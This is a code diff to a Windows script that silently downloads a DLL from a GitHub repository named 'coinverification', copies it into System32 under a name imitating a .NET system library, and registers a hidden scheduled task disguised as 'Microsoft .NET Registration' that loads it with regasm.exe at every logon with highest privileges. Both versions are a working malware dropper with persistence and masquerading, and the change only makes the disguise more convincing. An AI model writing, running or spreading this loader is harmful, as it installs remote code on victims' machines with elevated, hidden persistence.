@@ -1,8 +1,8 @@
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/random.dll' -OutFile 'C:\Users\Public\random.dll'"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/System.Runtime.InteropQ.dll' -OutFile 'C:\Users\Public\System.Runtime.InteropQ.dll'"
 
-copy /Y "C:\Users\Public\random.dll" "C:\Windows\System32\random.dll"
+copy /Y "C:\Users\Public\System.Runtime.InteropQ.dll" "C:\Windows\System32\System.Runtime.InteropQ.dll"
 
 
-schtasks /create /tn "Microsoft .NET Registrationx" /tr "powershell.exe -WindowStyle Hidden -Command \"Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\windows\system32\random.dll' -WindowStyle Hidden -Verb RunAs\"" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
+schtasks /create /tn "Microsoft .NET Registrationz" /tr "powershell.exe -WindowStyle Hidden -Command \"Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\windows\system32\System.Runtime.InteropQ.dll' -WindowStyle Hidden -Verb RunAs\"" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
 
-schtasks /run /tn "Microsoft .NET Registrationx"
+schtasks /run /tn "Microsoft .NET Registrationz"
